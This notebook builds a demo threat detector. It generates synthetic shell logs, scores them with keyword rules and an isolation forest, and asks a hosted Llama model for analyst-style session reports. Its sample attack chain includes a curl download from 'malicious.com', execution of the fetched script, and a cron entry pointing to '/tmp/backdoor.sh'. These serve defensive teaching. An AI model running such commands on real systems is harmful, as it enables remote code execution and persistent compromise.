### **AI Threat Detector Simulator**

Create production like logs.
Note: In real world scenario, we will need to work on data cleanup to align it with the workable demo.

In [1]:
import pandas as pd
import random
from datetime import datetime, timedelta

users = ["user1", "user2", "root"]

# Normal commands
normal_commands = [
    ("ls -la", "benign", None),
    ("vim file.txt", "benign", None),
    ("python app.py", "benign", None),
    ("ssh user@host", "benign", None),
]

# Attack chain mapped to MITRE
attack_chain = [
    {
        "command": "curl http://malicious.com/script.sh",
        "process": "curl",
        "stage": "Command and Control",
        "technique": "T1105"
    },
    {
        "command": "bash script.sh",
        "process": "bash",
        "stage": "Execution",
        "technique": "T1059"
    },
    {
        "command": "echo '* * * * * /tmp/backdoor.sh' > cron",
        "process": "cron",
        "stage": "Persistence",
        "technique": "T1053"
    }
]

data = []
start_time = datetime.now()

for session in range(30):
    timestamp = start_time + timedelta(minutes=session * 5)
    user = random.choice(users)

    if random.random() < 0.35:  # 35% attack sessions
        for step in attack_chain:
            data.append({
                "timestamp": timestamp,
                "session_id": session,
                "process": step["process"],
                "command": step["command"],
                "user": user,
                "attack_stage": step["stage"],
                "technique_id": step["technique"],
                "label": "suspicious"
            })
            timestamp += timedelta(seconds=40)
    else:
        for _ in range(random.randint(2, 5)):
            cmd, stage, tech = random.choice(normal_commands)
            data.append({
                "timestamp": timestamp,
                "session_id": session,
                "process": cmd.split()[0],
                "command": cmd,
                "user": user,
                "attack_stage": stage,
                "technique_id": tech,
                "label": "normal"
            })
            timestamp += timedelta(seconds=40)

df = pd.DataFrame(data)
df.head(20)

,timestamp,session_id,process,command,user,attack_stage,technique_id,label
0,2026-03-24 09:03:58.983981,0,python,python app.py,user1,benign,None,normal
1,2026-03-24 09:04:38.983981,0,vim,vim file.txt,user1,benign,None,normal
2,2026-03-24 09:08:58.983981,1,curl,curl http://malicious.com/script.sh,user1,Command and Control,T1105,suspicious
3,2026-03-24 09:09:38.983981,1,bash,bash script.sh,user1,Execution,T1059,suspicious
4,2026-03-24 09:10:18.983981,1,cron,echo '* * * * * /tmp/backdoor.sh' > cron,user1,Persistence,T1053,suspicious
5,2026-03-24 09:13:58.983981,2,curl,curl http://malicious.com/script.sh,root,Command and Control,T1105,suspicious
6,2026-03-24 09:14:38.983981,2,bash,bash script.sh,root,Execution,T1059,suspicious
7,2026-03-24 09:15:18.983981,2,cron,echo '* * * * * /tmp/backdoor.sh' > cron,root,Persistence,T1053,suspicious
8,2026-03-24 09:18:58.983981,3,vim,vim file.txt,user1,benign,None,normal
9,2026-03-24 09:19:38.983981,3,vim,vim file.txt,user1,benign,None,normal


Model the detection logic with a scorer

In [2]:
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import LabelEncoder

df_copy = df.copy()

# ---------------------------
# 1. RULE-BASED DETECTION
# ---------------------------

def rule_based_score(row):
    score = 0

    # Suspicious keywords
    if "curl" in row["command"] or "wget" in row["command"]:
        score += 2
    if "bash" in row["command"] and "http" in row["command"]:
        score += 3
    if "cron" in row["command"]:
        score += 3
    if row["user"] == "root":
        score += 1

    return score

df_copy["rule_score"] = df_copy.apply(rule_based_score, axis=1)

# ---------------------------
# 2. FEATURE ENGINEERING
# ---------------------------

le_process = LabelEncoder()
le_user = LabelEncoder()

df_copy["process_enc"] = le_process.fit_transform(df_copy["process"])
df_copy["user_enc"] = le_user.fit_transform(df_copy["user"])
df_copy["command_length"] = df_copy["command"].apply(len)

features = df_copy[["process_enc", "user_enc", "command_length"]]

# ---------------------------
# 3. ANOMALY DETECTION
# ---------------------------

model = IsolationForest(contamination=0.2, random_state=42)
df_copy["anomaly_score"] = model.fit_predict(features)

# Convert (-1 = anomaly, 1 = normal) → score
df_copy["anomaly_score"] = df_copy["anomaly_score"].apply(lambda x: 1 if x == -1 else 0)

# ---------------------------
# 4. FINAL SCORING
# ---------------------------

df_copy["final_score"] = df_copy["rule_score"] + df_copy["anomaly_score"]

# Flag suspicious
df_copy["flagged"] = df_copy["final_score"] >= 3

df_copy.head(20)

,timestamp,session_id,process,command,user,attack_stage,technique_id,label,rule_score,process_enc,user_enc,command_length,anomaly_score,final_score,flagged
0,2026-03-24 09:03:58.983981,0,python,python app.py,user1,benign,None,normal,0,4,1,13,0,0,False
1,2026-03-24 09:04:38.983981,0,vim,vim file.txt,user1,benign,None,normal,0,6,1,12,0,0,False
2,2026-03-24 09:08:58.983981,1,curl,curl http://malicious.com/script.sh,user1,Command and Control,T1105,suspicious,2,2,1,35,0,2,False
3,2026-03-24 09:09:38.983981,1,bash,bash script.sh,user1,Execution,T1059,suspicious,0,0,1,14,0,0,False
4,2026-03-24 09:10:18.983981,1,cron,echo '* * * * * /tmp/backdoor.sh' > cron,user1,Persistence,T1053,suspicious,3,1,1,40,0,3,True
5,2026-03-24 09:13:58.983981,2,curl,curl http://malicious.com/script.sh,root,Command and Control,T1105,suspicious,3,2,0,35,1,4,True
6,2026-03-24 09:14:38.983981,2,bash,bash script.sh,root,Execution,T1059,suspicious,1,0,0,14,1,2,False
7,2026-03-24 09:15:18.983981,2,cron,echo '* * * * * /tmp/backdoor.sh' > cron,root,Persistence,T1053,suspicious,4,1,0,40,1,5,True
8,2026-03-24 09:18:58.983981,3,vim,vim file.txt,user1,benign,None,normal,0,6,1,12,0,0,False
9,2026-03-24 09:19:38.983981,3,vim,vim file.txt,user1,benign,None,normal,0,6,1,12,0,0,False


Check detection

In [3]:
df_copy["flagged"].value_counts()

,count
flagged,
False,83
True,12


View flagged cases

In [4]:
df_copy[df_copy["flagged"] == True].head(10)

,timestamp,session_id,process,command,user,attack_stage,technique_id,label,rule_score,process_enc,user_enc,command_length,anomaly_score,final_score,flagged
4,2026-03-24 09:10:18.983981,1,cron,echo '* * * * * /tmp/backdoor.sh' > cron,user1,Persistence,T1053,suspicious,3,1,1,40,0,3,True
5,2026-03-24 09:13:58.983981,2,curl,curl http://malicious.com/script.sh,root,Command and Control,T1105,suspicious,3,2,0,35,1,4,True
7,2026-03-24 09:15:18.983981,2,cron,echo '* * * * * /tmp/backdoor.sh' > cron,root,Persistence,T1053,suspicious,4,1,0,40,1,5,True
30,2026-03-24 09:45:18.983981,8,cron,echo '* * * * * /tmp/backdoor.sh' > cron,user1,Persistence,T1053,suspicious,3,1,1,40,0,3,True
46,2026-03-24 10:10:18.983981,13,cron,echo '* * * * * /tmp/backdoor.sh' > cron,user1,Persistence,T1053,suspicious,3,1,1,40,0,3,True
53,2026-03-24 10:23:58.983981,16,curl,curl http://malicious.com/script.sh,root,Command and Control,T1105,suspicious,3,2,0,35,1,4,True
55,2026-03-24 10:25:18.983981,16,cron,echo '* * * * * /tmp/backdoor.sh' > cron,root,Persistence,T1053,suspicious,4,1,0,40,1,5,True
56,2026-03-24 10:28:58.983981,17,curl,curl http://malicious.com/script.sh,root,Command and Control,T1105,suspicious,3,2,0,35,1,4,True
58,2026-03-24 10:30:18.983981,17,cron,echo '* * * * * /tmp/backdoor.sh' > cron,root,Persistence,T1053,suspicious,4,1,0,40,1,5,True
75,2026-03-24 11:00:18.983981,23,cron,echo '* * * * * /tmp/backdoor.sh' > cron,user1,Persistence,T1053,suspicious,3,1,1,40,0,3,True


GROQ LLM - Free Tier

In [5]:
!pip install groq

   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 139.7/139.7 kB 3.6 MB/s eta 0:00:00


In [7]:
from google.colab import userdata
from groq import Groq

client = Groq(api_key=userdata.get("GROQ_API_KEY"))

In [8]:
def build_prompt(row):
    return f"""
You are a cybersecurity analyst.

Analyze this system event:

Command: {row['command']}
Process: {row['process']}
User: {row['user']}

Respond in this format:

Explanation:
- What does this command do?

Suspicion:
- Why could this be malicious?

Attack Stage:
- Likely stage (Execution, Persistence, etc.)

Next Steps:
- What should be investigated next?
"""

In [14]:
def analyze_with_llm(row):
    prompt = build_prompt(row)

    response = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=[
            {"role": "system", "content": "You are an expert cybersecurity analyst."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.2
    )

    return response.choices[0].message.content

Sample LLM Test

In [15]:
sample = df_copy[df_copy["flagged"] == True].iloc[0]
print(analyze_with_llm(sample))

Explanation:
- This command uses the `echo` command to append a new cron job to the cron table. The cron job is set to run every minute (`* * * * *`) and executes a script located at `/tmp/backdoor.sh`. The output of the `echo` command is redirected to a file named `cron`, which is likely the cron table for the user `user1`. 

Suspicion:
- This could be malicious because it attempts to add a new cron job that runs a script from a temporary directory (`/tmp`), which is an unusual location for a legitimate script. Additionally, the script is named `backdoor.sh`, which suggests that it may be a malicious backdoor script designed to provide unauthorized access to the system. The fact that the script is being added to the cron table without going through the usual cron configuration files (`crontab` command) also raises suspicions.

Attack Stage:
- Likely stage: Persistence. The attacker is trying to ensure that the malicious script runs continuously, even after a system reboot. By adding t

Check logs

In [16]:
def get_session_logs(df, row):
    session_id = row["session_id"]
    return df[df["session_id"] == session_id]

Build Agent

In [22]:
def build_agent_prompt(session_df):
    logs = ""

    for _, r in session_df.iterrows():
        logs += f"- {r['timestamp']} | {r['process']} | {r['command']} | user={r['user']}\n"

    return f"""
You are a cybersecurity analyst investigating a sequence of system events.

Here is the full activity timeline:
{logs}

Instructions:
- Avoid generic explanations
- Tailor reasoning to this specific session (user, commands, sequence)
- Consider user privilege, frequency, and system-level impact

Tasks:

1. Summary of Events
- What happened in this session?

2. Attack Pattern Identification
- Is this an attack? What type?

3. Attack Chain Explanation
- Explain step-by-step what the attacker is doing

4. MITRE ATT&CK Mapping
- Map each step to attack stages (Execution, Persistence, etc.)

5. Detection Signals
- What signals triggered detection?
  (e.g., unusual command, root execution, persistence mechanism)

6. Risk Level
- Low / Medium / High / Critical (justify briefly)

7. Confidence Level
- Low / Medium / High (justify briefly)

8. Suggested Next Steps
- What should a security team do next?

Be structured, specific, and concise.
"""

Define agent investigation

In [23]:
def investigate_with_agent(df, row):
    session_df = df[df["session_id"] == row["session_id"]]
    prompt = build_agent_prompt(session_df)

    response = client.chat.completions.create(
        model="llama-3.3-70b-versatile",
        messages=[
            {"role": "system", "content": "You are an expert cybersecurity analyst."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.2
    )

    return response.choices[0].message.content

In [24]:
unique_sessions = df_copy[df_copy["flagged"] == True]["session_id"].unique()
unique_sessions

array([ 1,  2,  8, 13, 16, 17, 23, 25, 27])

Make Agent Investigate

In [25]:
reports = []

for session_id in unique_sessions:
    row = df_copy[df_copy["session_id"] == session_id].iloc[0]

    report = investigate_with_agent(df_copy, row)

    reports.append({
        "session_id": int(session_id),
        "report": report
    })

reports

[{'session_id': 1,
  'report': "### 1. Summary of Events\nIn this session, user `user1` executed a sequence of commands that involved downloading a script from a potentially malicious website (`http://malicious.com/script.sh`), executing the script using `bash`, and then setting up a cron job that points to a backdoor script (`/tmp/backdoor.sh`). This sequence of events suggests a potential security breach.\n\n### 2. Attack Pattern Identification\nYes, this appears to be an attack. The pattern suggests a remote access trojan (RAT) or backdoor attack, where the attacker gains access to the system, executes malicious scripts, and establishes persistence.\n\n### 3. Attack Chain Explanation\n1. **Initial Access**: The attacker starts by using `curl` to download a script from `http://malicious.com/script.sh`. This could be a malicious script designed to gain initial access or to prepare the system for further exploitation.\n2. **Execution**: The downloaded script (`script.sh`) is then execu

Save reults to JSON

In [26]:
import json

with open("reports.json", "w") as f:
    json.dump(reports, f, indent=2)

print("Saved to reports.json")

Saved to reports.json


Evaluation

In [27]:
# True labels vs predicted flags
y_true = df_copy["label"].apply(lambda x: 1 if x == "suspicious" else 0)
y_pred = df_copy["flagged"].apply(lambda x: 1 if x else 0)

from sklearn.metrics import classification_report

print(classification_report(y_true, y_pred))

              precision    recall  f1-score   support

           0       0.82      1.00      0.90        68
           1       1.00      0.44      0.62        27

    accuracy                           0.84        95
   macro avg       0.91      0.72      0.76        95
weighted avg       0.87      0.84      0.82        95



Define detection signals

In [28]:
def extract_detection_signals(row):
    signals = []

    if "curl" in row["command"] or "wget" in row["command"]:
        signals.append("External script download")

    if "bash" in row["command"]:
        signals.append("Script execution")

    if "cron" in row["command"]:
        signals.append("Persistence mechanism")

    if row["user"] == "root":
        signals.append("High privilege execution")

    if row["anomaly_score"] == 1:
        signals.append("Anomalous behavior (ML)")

    return signals


df_copy["detection_signals"] = df_copy.apply(extract_detection_signals, axis=1)

df_copy[df_copy["flagged"] == True][["command", "detection_signals"]].head()

,command,detection_signals
4,echo '* * * * * /tmp/backdoor.sh' > cron,[Persistence mechanism]
5,curl http://malicious.com/script.sh,"[External script download, High privilege exec..."
7,echo '* * * * * /tmp/backdoor.sh' > cron,"[Persistence mechanism, High privilege executi..."
30,echo '* * * * * /tmp/backdoor.sh' > cron,[Persistence mechanism]
46,echo '* * * * * /tmp/backdoor.sh' > cron,[Persistence mechanism]
